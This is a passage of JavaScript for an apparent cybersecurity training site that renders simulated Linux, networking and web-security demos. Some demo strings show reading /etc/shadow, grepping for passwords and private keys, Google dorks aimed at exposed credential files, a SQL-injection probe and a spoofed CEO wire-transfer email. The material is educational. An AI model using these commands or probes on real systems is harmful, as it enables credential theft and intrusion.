            help:function(){return 'Available: ls, pwd, whoami, id, uname, hostname, date, cat <file>, echo <text>, clear';},
            clear:function(){return '__CLEAR__';}
        };
        var out=$('#termOut');
        $('#termIn').onkeydown=function(e){
            if(e.key!=='Enter')return;
            var cmd=$('#termIn').value.trim();$('#termIn').value='';
            if(!cmd)return;
            var result;var parts=cmd.split(/\s+/);
            if(parts[0]==='cat'&&parts[1]){var path=parts[1].replace(/^\//,'');result=fs[path]||'cat: '+parts[1]+': No such file or directory';}
            else if(parts[0]==='echo') result=parts.slice(1).join(' ');
            else if(cmds[parts[0]]) result=cmds[parts[0]]();
            else result=parts[0]+': command not found';
            if(result==='__CLEAR__'){out.innerHTML='';}else{out.innerHTML+='<div style="color:#ccc">user@zentinels:~$ '+esc(cmd)+'</div><div>'+esc(result)+'</div>';out.scrollTop=out.scrollHeight;}
        };
    }

    /* ============================================================
       C3: SUDO DEMO
       ============================================================ */
    function demoSudo(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">INTERACTIVE</span><span class="demo-title">sudo vs su</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap" id="sudoBtns"><button class="demo-btn demo-btn-sm active" data-s="user">Normal User</button><button class="demo-btn demo-btn-sm" data-s="sudo">sudo command</button><button class="demo-btn demo-btn-sm" data-s="su">su - (root)</button></div><div id="sudoTerm" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:150px;white-space:pre-line"></div></div></div>';
        var scenarios={
            user:'user@box:~$ cat /etc/shadow\ncat: /etc/shadow: Permission denied\n\nuser@box:~$ apt install nmap\nE: Could not open lock file - open (13: Permission denied)',
            sudo:'user@box:~$ sudo cat /etc/shadow\n[sudo] password for user: ****\nroot:$6$randomhash:19000:0:99999:7:::\nuser:$6$anotherhash:19000:0:99999:7:::\n\nsudo runs ONE command as root. Your password. Audit trail logged.',
            su:'user@box:~$ su -\nPassword: ****\nroot@box:~# whoami\nroot\nroot@box:~# cat /etc/shadow\nroot:$6$randomhash:19000:0:99999:7:::\n\nsu opens a ROOT SHELL. Requires root password. No audit trail. Dangerous!'
        };
        $$('#sudoBtns .demo-btn').forEach(function(b){b.onclick=function(){
            $$('#sudoBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');
            $('#sudoTerm').textContent=scenarios[b.dataset.s];
        };});
        $('#sudoTerm').textContent=scenarios.user;
    }

    /* ============================================================
       C3: LINUX FOLDERS DEMO
       ============================================================ */
    function demoFolders(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Linux Directory Structure</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dirBtns"></div><div id="dirDesc" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.85rem;line-height:1.8"></div></div></div>';
        var dirs={'/':'Root of the entire filesystem','/bin':'Essential command binaries: ls, cp, cat, grep','/etc':'System configuration files: passwd, shadow, fstab','/home':'User home directories','/var':'Variable data: logs, databases, web content','/tmp':'Temporary files. Cleared on reboot','/root':'Root user home directory (NOT /home/root)','/dev':'Device files. Hardware as files: /dev/sda, /dev/null','/proc':'Virtual filesystem: process and kernel info'};
        var btns=$('#dirBtns');
        Object.keys(dirs).forEach(function(d){btns.innerHTML+='<button class="demo-btn demo-btn-sm" data-dir="'+d+'">'+d+'</button>';});
        $$('#dirBtns .demo-btn').forEach(function(b){b.onclick=function(){
            $$('#dirBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');
            $('#dirDesc').innerHTML='<strong>'+b.dataset.dir+'</strong><br>'+dirs[b.dataset.dir];
        };});
    }

    /* ============================================================
       C3: FILE PERMISSIONS DEMO
       ============================================================ */
    function demoPermissions(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">INTERACTIVE</span><span class="demo-title">File Permission Calculator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:24px;justify-content:center;flex-wrap:wrap" id="permGrid"></div><div style="text-align:center;font-family:var(--font-mono);font-size:1.5rem" id="permResult">-rwxr-xr-x = 755</div><div id="permCmd" style="text-align:center;font-family:var(--font-mono);font-size:0.9rem;color:var(--text-muted)">chmod 755 file.txt</div></div></div>';
        var cats=['Owner','Group','Others'];var perms=['r','w','x'];var vals=[4,2,1];
        var bits=[[1,1,1],[1,0,1],[1,0,1]];
        function render(){
            var grid=$('#permGrid');grid.innerHTML='';
            cats.forEach(function(c,ci){
                var html='<div style="text-align:center"><div style="font-weight:bold;margin-bottom:8px">'+c+'</div>';
                perms.forEach(function(p,pi){
                    var on=bits[ci][pi];
                    html+='<button class="demo-btn demo-btn-sm permBit" data-ci="'+ci+'" data-pi="'+pi+'" style="width:40px;height:40px;margin:2px;'+(on?'background:var(--accent);color:white':'')+'">'+(on?p:'-')+'</button>';
                });
                html+='</div>';grid.innerHTML+=html;
            });
            var str='-';var num='';
            cats.forEach(function(c,ci){var n=0;perms.forEach(function(p,pi){str+=bits[ci][pi]?p:'-';n+=bits[ci][pi]?vals[pi]:0;});num+=n;});
            $('#permResult').textContent=str+' = '+num;$('#permCmd').textContent='chmod '+num+' file.txt';
            $$('.permBit').forEach(function(b){b.onclick=function(){bits[+b.dataset.ci][+b.dataset.pi]=bits[+b.dataset.ci][+b.dataset.pi]?0:1;render();};});
        }
        render();
    }

    /* ============================================================
       C3: ENVIRONMENT VARIABLES DEMO
       ============================================================ */
    function demoEnvVars(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Environment Variables</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px"><div>$ echo $PATH</div><div style="color:#ccc">/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</div><div style="margin-top:8px">$ echo $HOME</div><div style="color:#ccc">/home/user</div><div style="margin-top:8px">$ echo $USER</div><div style="color:#ccc">user</div><div style="margin-top:8px">$ echo $SHELL</div><div style="color:#ccc">/bin/bash</div><div style="margin-top:8px;color:#ff6b6b">$ export API_KEY="sk-12345secret"  -- Visible in env!</div><div style="margin-top:4px;color:#ff6b6b">$ env | grep API_KEY</div><div style="color:#ccc">API_KEY=sk-12345secret</div></div><div style="font-size:0.85rem;color:var(--text-muted);text-align:center">Never store secrets in environment variables in production -- use a secrets manager!</div></div></div>';
    }

    function demoFileOps(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">INTERACTIVE</span><span class="demo-title">File Operations Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap"><button class="demo-btn demo-btn-sm" id="fopMkdir">mkdir</button><button class="demo-btn demo-btn-sm" id="fopTouch">touch</button><button class="demo-btn demo-btn-sm" id="fopCp">cp</button><button class="demo-btn demo-btn-sm" id="fopMv">mv</button><button class="demo-btn demo-btn-sm" id="fopRm" style="background:var(--danger);color:white">rm -rf</button></div><div id="fopTree" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:120px">/home/user/</div></div></div>';
        var files=['file1.txt','file2.txt'];var dirs=[];
        function render(){var t='/home/user/\n';dirs.forEach(function(d){t+='  '+d+'/\n';});files.forEach(function(f){t+='  '+f+'\n';});$('#fopTree').textContent=t;}
        $('#fopMkdir').onclick=function(){dirs.push('newdir');render();};
        $('#fopTouch').onclick=function(){files.push('newfile_'+Date.now()%1000+'.txt');render();};
        $('#fopCp').onclick=function(){if(files.length)files.push(files[0]+'.bak');render();};
        $('#fopMv').onclick=function(){if(files.length)files[files.length-1]='renamed_'+files[files.length-1];render();};
        $('#fopRm').onclick=function(){files=[];dirs=[];render();};
        render();
    }

    function demoSearch(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">grep and find Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><select id="srchCmd" style="padding:6px;border-radius:4px;border:1px solid var(--border)"><option value="grep">grep</option><option value="find">find</option></select><input id="srchIn" placeholder="password" style="flex:1;min-width:150px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"><button class="demo-btn demo-btn-sm" id="srchGo">Search</button></div><div id="srchOut" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:100px"></div></div></div>';
        var grepData={'password':'/etc/config.php:$db_pass = "admin123";\n/var/www/.env:DB_PASSWORD=secret\n/home/user/.bash_history:mysql -u root -pS3cr3t','root':'/etc/passwd:root:x:0:0:root:/root:/bin/bash\n/etc/shadow:root:$6$hash...\n/var/log/auth.log:root login accepted','error':'/var/log/syslog:kernel: error reading sector 42\n/var/log/apache2/error.log:PHP Fatal error'};
        var findData={'*.conf':'/etc/apache2/apache2.conf\n/etc/ssh/sshd_config\n/etc/mysql/my.cnf','*.log':'/var/log/syslog\n/var/log/auth.log\n/var/log/apache2/access.log','*.key':'/home/user/.ssh/id_rsa\n/etc/ssl/private/server.key'};
        $('#srchGo').onclick=function(){
            var cmd=$('#srchCmd').value,q=$('#srchIn').value.toLowerCase();
            var data=cmd==='grep'?grepData:findData;
            var match=Object.keys(data).find(function(k){return q.indexOf(k)>=0||k.indexOf(q)>=0;});
            $('#srchOut').textContent=match?'$ '+cmd+' "'+q+'"\n\n'+data[match]:'$ '+cmd+' "'+q+'"\nNo results found';
        };
    }

    function demoProcesses(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Process Manager</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div id="procList" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.75rem;padding:16px;border-radius:8px;overflow-x:auto"></div><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn demo-btn-sm" id="procRefresh">Refresh</button><button class="demo-btn demo-btn-sm" id="procKill" style="background:var(--danger);color:white">Kill Top Process</button></div></div></div>';
        var procs=[{pid:1,user:'root',cpu:'0.0',mem:'0.5',cmd:'/sbin/init'},{pid:423,user:'root',cpu:'0.2',mem:'1.2',cmd:'apache2'},{pid:567,user:'www-data',cpu:'15.3',mem:'3.4',cmd:'php-fpm'},{pid:890,user:'user',cpu:'45.2',mem:'12.1',cmd:'firefox'},{pid:1234,user:'user',cpu:'2.1',mem:'0.8',cmd:'python3 app.py'},{pid:1567,user:'root',cpu:'0.1',mem:'0.3',cmd:'sshd'}];
        function render(){var t='USER       PID  %CPU  %MEM  COMMAND\n';procs.forEach(function(p){t+=p.user.padEnd(10)+String(p.pid).padEnd(5)+p.cpu.padStart(5)+'  '+p.mem.padStart(5)+'  '+p.cmd+'\n';});$('#procList').textContent=t;}
        $('#procRefresh').onclick=function(){procs.forEach(function(p){p.cpu=(Math.random()*50).toFixed(1);p.mem=(Math.random()*15).toFixed(1);});render();};
        $('#procKill').onclick=function(){if(procs.length>1){var top=procs.reduce(function(a,b){return +a.cpu>+b.cpu?a:b;});procs=procs.filter(function(p){return p!==top;});render();}};
        render();
    }

    function demoPipes(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Pipes and Redirects</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="pipeBtns"><button class="demo-btn demo-btn-sm" data-p="1">cat | grep</button><button class="demo-btn demo-btn-sm" data-p="2">ps | grep | wc</button><button class="demo-btn demo-btn-sm" data-p="3">echo > file</button><button class="demo-btn demo-btn-sm" data-p="4">cmd 2>/dev/null</button></div><div id="pipeOut" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:120px;white-space:pre-line"></div></div></div>';
        var examples={'1':'$ cat access.log | grep "404"\n\n192.168.1.5 - "GET /admin" 404\n192.168.1.8 - "GET /wp-login.php" 404\n\nPipe (|) sends output of cat as input to grep','2':'$ ps aux | grep python | wc -l\n\n3\n\nChain: list processes -> filter python -> count lines','3':'$ echo "hello" > output.txt\n$ cat output.txt\nhello\n$ echo "world" >> output.txt\n$ cat output.txt\nhello\nworld\n\n> overwrites, >> appends','4':'$ find / -name "*.conf" 2>/dev/null\n\n/etc/ssh/sshd_config\n/etc/apache2/apache2.conf\n\n2>/dev/null discards error messages'};
        $$('#pipeBtns .demo-btn').forEach(function(b){b.onclick=function(){if(b.dataset.p)$('#pipeOut').textContent=examples[b.dataset.p];};});
    }

    function demoSSH(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">SSH Connection</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn" id="sshConnect">Connect via SSH</button></div><div id="sshOut" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:150px;white-space:pre-line"></div></div></div>';
        var lines=['$ ssh user@192.168.1.100','The authenticity of host cannot be established.','ED25519 key fingerprint is SHA256:abc123...xyz','Are you sure you want to continue connecting? yes','Warning: Permanently added 192.168.1.100 to known hosts.','user@192.168.1.100 password: ****','Welcome to Ubuntu 22.04 LTS','Last login: Mon Jan 1 10:00:00 2025','user@remote:~$ '];
        $('#sshConnect').onclick=function(){var out=$('#sshOut');out.textContent='';var i=0;var iv=setInterval(function(){if(i<lines.length){out.textContent+=lines[i]+'\n';i++;}else clearInterval(iv);},400);};
    }

    /* ============================================================
       C4: GOOGLE DORKS DEMO
       ============================================================ */
    function demoDorks(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">OSINT</span><span class="demo-title">Google Dorks Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;justify-content:center"><input id="dorkIn" value="site:example.com filetype:pdf" style="flex:1;min-width:250px;padding:10px;border-radius:20px;border:1px solid var(--border);font-family:var(--font-mono);font-size:0.85rem"><button class="demo-btn" id="dorkGo">Search</button></div><div id="dorkResults" style="font-size:0.85rem;line-height:1.8"></div></div></div>';
        var dorks={'site:':'example.com/reports/financial-2024.pdf\nexample.com/docs/employee-handbook.pdf\nexample.com/internal/passwords.pdf [SENSITIVE]','intitle:':'Index of /backup/passwords/\nIndex of /admin/credentials/\nExposed directory listings!','inurl:':'example.com/wp-admin/login.php\nblog.target.com/wp-admin/\nWordPress admin panels found!','filetype:':'example.com/reports/financial-2024.pdf\nexample.com/internal/passwords.pdf'};
        $('#dorkGo').onclick=function(){var q=$('#dorkIn').value;var match=Object.keys(dorks).find(function(k){return q.indexOf(k)>=0;});$('#dorkResults').innerHTML=match?'<pre style="white-space:pre-wrap">Results for: '+esc(q)+'\n\n'+dorks[match]+'</pre>':'<div>No results. Try adding site:, intitle:, inurl:, or filetype: operators</div>';};
    }

    function demoHTTP(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">HTTP Request/Response Viewer</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap" id="httpBtns"><button class="demo-btn demo-btn-sm active" data-h="get">GET /</button><button class="demo-btn demo-btn-sm" data-h="post">POST /login</button><button class="demo-btn demo-btn-sm" data-h="404">GET /missing</button><button class="demo-btn demo-btn-sm" data-h="500">GET /crash</button></div><div style="display:flex;gap:16px;flex-wrap:wrap"><div style="flex:1;min-width:250px"><div style="font-weight:bold;margin-bottom:4px;font-size:0.85rem">Request</div><pre id="httpReq" style="background:#1a1a2e;color:#00ff41;padding:12px;border-radius:8px;font-size:0.78rem;overflow-x:auto"></pre></div><div style="flex:1;min-width:250px"><div style="font-weight:bold;margin-bottom:4px;font-size:0.85rem">Response</div><pre id="httpRes" style="background:#1a1a2e;color:#00ff41;padding:12px;border-radius:8px;font-size:0.78rem;overflow-x:auto"></pre></div></div></div></div>';
        var data={get:{req:'GET / HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\nAccept: text/html',res:'HTTP/1.1 200 OK\nServer: nginx/1.18\nContent-Type: text/html\n\n<html>...</html>'},post:{req:'POST /login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=secret',res:'HTTP/1.1 302 Found\nLocation: /dashboard\nSet-Cookie: session=abc123; HttpOnly'},'404':{req:'GET /admin/secret HTTP/1.1\nHost: example.com',res:'HTTP/1.1 404 Not Found\nContent-Type: text/html\n\n404 - Page Not Found'},'500':{req:'GET /api/data?id=1\' HTTP/1.1\nHost: example.com',res:'HTTP/1.1 500 Internal Server Error\nServer: Apache/2.4.49\n\nError: SQL syntax error\nPossible injection!'}};
        function show(k){$('#httpReq').textContent=data[k].req;$('#httpRes').textContent=data[k].res;}
        $$('#httpBtns .demo-btn').forEach(function(b){b.onclick=function(){if(b.dataset.h){$$('#httpBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');show(b.dataset.h);}};});
        show('get');
    }

    function demoCookies(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">INTERACTIVE</span><span class="demo-title">Cookie Inspector</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><input id="cookieName" value="session_id" placeholder="Name" style="width:120px;padding:6px;border-radius:4px;border:1px solid var(--border);font-family:var(--font-mono)"><input id="cookieVal" value="abc123xyz" placeholder="Value" style="width:150px;padding:6px;border-radius:4px;border:1px solid var(--border);font-family:var(--font-mono)"><button class="demo-btn demo-btn-sm" id="cookieSet">Set Cookie</button><button class="demo-btn demo-btn-sm" id="cookieRead">Read Cookies</button></div><div id="cookieOut" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-family:var(--font-mono);font-size:0.82rem"></div><div style="font-size:0.85rem;color:var(--text-muted);text-align:center">HttpOnly cookies cannot be read by JavaScript, protecting session IDs from XSS attacks</div></div></div>';
        $('#cookieSet').onclick=function(){document.cookie=$('#cookieName').value+'='+$('#cookieVal').value+';path=/;SameSite=Strict';$('#cookieOut').textContent='Cookie set: '+$('#cookieName').value+'='+$('#cookieVal').value;};
        $('#cookieRead').onclick=function(){$('#cookieOut').textContent='Current cookies:\n'+(document.cookie||'(none)').split(';').join('\n');};
    }

    /* ============================================================
       C5: NETWORK HARDWARE, IP, TCP/UDP, SUBNET, SPF, DNS, OSI, DoS
       ============================================================ */
    function demoNetHardware(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Network Devices</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap" id="netBtns"><button class="demo-btn demo-btn-sm active" data-d="switch">Switch</button><button class="demo-btn demo-btn-sm" data-d="hub">Hub</button><button class="demo-btn demo-btn-sm" data-d="router">Router</button></div><div id="netVis" style="text-align:center;padding:16px;background:var(--bg-secondary);border-radius:8px;font-size:0.85rem;min-height:120px"></div></div></div>';
        var info={switch:'<strong>Switch</strong><br>Reads MAC address table, sends to correct port only<br>Layer 2 (Data Link)<br>Efficient and Secure',hub:'<strong>Hub</strong><br>Sends data to ALL ports (broadcast)<br>Layer 1 (Physical)<br>Wasteful, Insecure (packet sniffing!)',router:'<strong>Router</strong><br>Connects two networks (LAN to Internet)<br>Layer 3 (Network) uses IP addresses<br>Has NAT, firewall, DHCP'};
        $$('#netBtns .demo-btn').forEach(function(b){b.onclick=function(){if(b.dataset.d){$$('#netBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');$('#netVis').innerHTML=info[b.dataset.d];}};});
        $('#netVis').innerHTML=info['switch'];
    }

    function demoIP(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">IP Address Checker</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><input id="ipIn" value="192.168.1.100" style="width:180px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"><button class="demo-btn demo-btn-sm" id="ipCheck">Check</button></div><div id="ipOut" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.85rem;text-align:center"></div></div></div>';
        $('#ipCheck').onclick=function(){
            var ip=$('#ipIn').value.trim();var parts=ip.split('.');
            if(parts.length!==4||parts.some(function(p){return isNaN(p)||+p<0||+p>255;})){$('#ipOut').innerHTML='Invalid IPv4 address';return;}
            var a=+parts[0],b=+parts[1];
            var type='Public',cls='';
            if(a===10){type='Private (Class A)';cls='10.0.0.0/8';}
            else if(a===172&&b>=16&&b<=31){type='Private (Class B)';cls='172.16.0.0/12';}
            else if(a===192&&b===168){type='Private (Class C)';cls='192.168.0.0/16';}
            else if(a===127){type='Loopback';cls='127.0.0.0/8';}
            var bin=parts.map(function(p){return (+p).toString(2).padStart(8,'0');}).join('.');
            $('#ipOut').innerHTML='<strong>'+type+'</strong>'+(cls?' - '+cls:'')+'<br>Binary: <code>'+bin+'</code>';
        };$('#ipCheck').click();
    }

    function demoTCPUDP(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">TCP Handshake vs UDP</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn active" id="tcpBtn">TCP (Reliable)</button><button class="demo-btn" id="udpBtn">UDP (Fast)</button></div><div id="protoVis" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-family:var(--font-mono);font-size:0.82rem;text-align:center;min-height:150px;white-space:pre"></div></div></div>';
        var tcp='Client              Server\n  |                    |\n  |---- SYN ---------> |  1. Request connection\n  |                    |\n  |<--- SYN/ACK ------ |  2. Acknowledge + accept\n  |                    |\n  |---- ACK ---------> |  3. Connection established\n  |                    |\n  |<=== DATA =========>|  4. Reliable data transfer\n  |                    |\n  |---- FIN ---------> |  5. Close connection';
        var udp='Client              Server\n  |                    |\n  |==== DATA =========>|  Just send it!\n  |==== DATA =========>|  No handshake needed\n  |==== DATA =========>|  No acknowledgement\n  |    X LOST X        |  Lost packet? Oh well!\n  |==== DATA =========>|  Keep sending\n  |                    |\n  Fast but unreliable   Use: Video, Gaming, DNS';
        function show(p){$('#protoVis').textContent=p==='tcp'?tcp:udp;}
        $('#tcpBtn').onclick=function(){$('#tcpBtn').classList.add('active');$('#udpBtn').classList.remove('active');show('tcp');};
        $('#udpBtn').onclick=function(){$('#udpBtn').classList.add('active');$('#tcpBtn').classList.remove('active');show('udp');};
        show('tcp');
    }

    function demoSubnet(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Subnet Calculator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><input id="subIp" value="192.168.1.0" style="width:140px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"><span>/</span><input id="subCidr" type="number" min="8" max="30" value="24" style="width:60px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);text-align:center"><button class="demo-btn demo-btn-sm" id="subCalc">Calculate</button></div><div id="subOut" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-family:var(--font-mono);font-size:0.85rem;white-space:pre"></div></div></div>';
        $('#subCalc').onclick=function(){
            var cidr=+$('#subCidr').value;var hosts=Math.pow(2,32-cidr)-2;
            var maskBin='';for(var i=0;i<32;i++)maskBin+=i<cidr?'1':'0';
            var mask=[maskBin.slice(0,8),maskBin.slice(8,16),maskBin.slice(16,24),maskBin.slice(24,32)].map(function(b){return parseInt(b,2);}).join('.');
            var ip=$('#subIp').value.split('.').map(Number);
            var netParts=ip.map(function(p,i){return p&parseInt(maskBin.slice(i*8,i*8+8),2);});
            var bcastParts=netParts.map(function(p,i){return p|(255-parseInt(maskBin.slice(i*8,i*8+8),2));});
            $('#subOut').textContent='Network: '+netParts.join('.')+'/'+cidr+'\nSubnet Mask: '+mask+'\nBroadcast: '+bcastParts.join('.')+'\nUsable Hosts: '+(hosts>0?hosts:0)+'\nFirst Host: '+netParts.slice(0,3).join('.')+'.'+(netParts[3]+1)+'\nLast Host: '+bcastParts.slice(0,3).join('.')+'.'+(bcastParts[3]-1);
        };$('#subCalc').click();
    }

    function demoSPF(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">INTERACTIVE</span><span class="demo-title">Email Spoofing and SPF Check</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:16px;flex-wrap:wrap"><div style="flex:1;min-width:200px"><div style="font-size:0.85rem;margin-bottom:4px"><strong>Compose Spoofed Email:</strong></div><div style="margin-bottom:4px"><span style="font-size:0.8rem;color:var(--text-muted)">FROM:</span><input id="spfFrom" value="ceo@company.com" style="width:100%;padding:6px;border-radius:4px;border:1px solid var(--border);font-family:var(--font-mono);font-size:0.8rem"></div><div><span style="font-size:0.8rem;color:var(--text-muted)">Subject:</span><input id="spfSubj" value="Urgent wire transfer" style="width:100%;padding:6px;border-radius:4px;border:1px solid var(--border);font-size:0.8rem"></div><button class="demo-btn demo-btn-sm" id="spfSend" style="margin-top:8px">Send</button></div><div style="flex:1;min-width:200px"><div style="font-size:0.85rem;margin-bottom:4px"><strong>SPF Check Result:</strong></div><div id="spfResult" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.82rem;min-height:100px"></div></div></div></div></div>';
        $('#spfSend').onclick=function(){
            var from=$('#spfFrom').value;var hasSPF=from.indexOf('company.com')>=0;
            $('#spfResult').innerHTML=hasSPF?'<div style="color:var(--danger)">SPF Check: FAIL</div><div style="font-size:0.8rem;margin-top:8px">Sending IP: 185.23.45.67<br>SPF Record: "v=spf1 ip4:10.0.0.0/8 -all"<br><br>Sender IP NOT authorized!<br>Action: Email marked as SPAM</div>':'<div style="color:var(--success)">No SPF record found</div><div style="font-size:0.8rem;margin-top:8px">This domain has no SPF protection!<br>Spoofed email will be delivered.</div>';
        };
    }

    function demoDNS(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">DNS Record Lookup</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><input id="dnsIn" value="example.com" style="width:180px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"><select id="dnsType" style="padding:8px;border-radius:6px;border:1px solid var(--border)"><option>A</option><option>AAAA</option><option>MX</option><option>NS</option><option>TXT</option></select><button class="demo-btn demo-btn-sm" id="dnsGo">Lookup</button></div><div id="dnsOut" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:80px;white-space:pre"></div></div></div>';
        var records={A:'example.com.    300  IN  A    93.184.216.34',AAAA:'example.com.    300  IN  AAAA 2606:2800:220:1:248:1893:25c8:1946',MX:'example.com.    300  IN  MX   10 mail.example.com.',NS:'example.com.    300  IN  NS   a.iana-servers.net.\nexample.com.    300  IN  NS   b.iana-servers.net.',TXT:'example.com.    300  IN  TXT  "v=spf1 ip4:93.184.216.34 -all"'};
        $('#dnsGo').onclick=function(){var t=$('#dnsType').value;$('#dnsOut').textContent='$ dig '+$('#dnsIn').value+' '+t+'\n\n;; ANSWER SECTION:\n'+records[t];};$('#dnsGo').click();
    }

    function demoOSI(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">OSI Model Explorer</span></div><div class="demo-visual" style="flex-direction:column;gap:4px" id="osiStack"></div></div>';
        var layers=[{n:7,name:'Application',ex:'HTTP, FTP, SMTP, DNS',color:'#e74c3c'},{n:6,name:'Presentation',ex:'SSL/TLS, JSON, JPEG',color:'#e67e22'},{n:5,name:'Session',ex:'Sockets, Sessions',color:'#f1c40f'},{n:4,name:'Transport',ex:'TCP, UDP',color:'#2ecc71'},{n:3,name:'Network',ex:'IP, ICMP, ARP',color:'#3498db'},{n:2,name:'Data Link',ex:'Ethernet, MAC, Switch',color:'#9b59b6'},{n:1,name:'Physical',ex:'Cables, Radio, Signals',color:'#34495e'}];
        var stack=$('#osiStack');
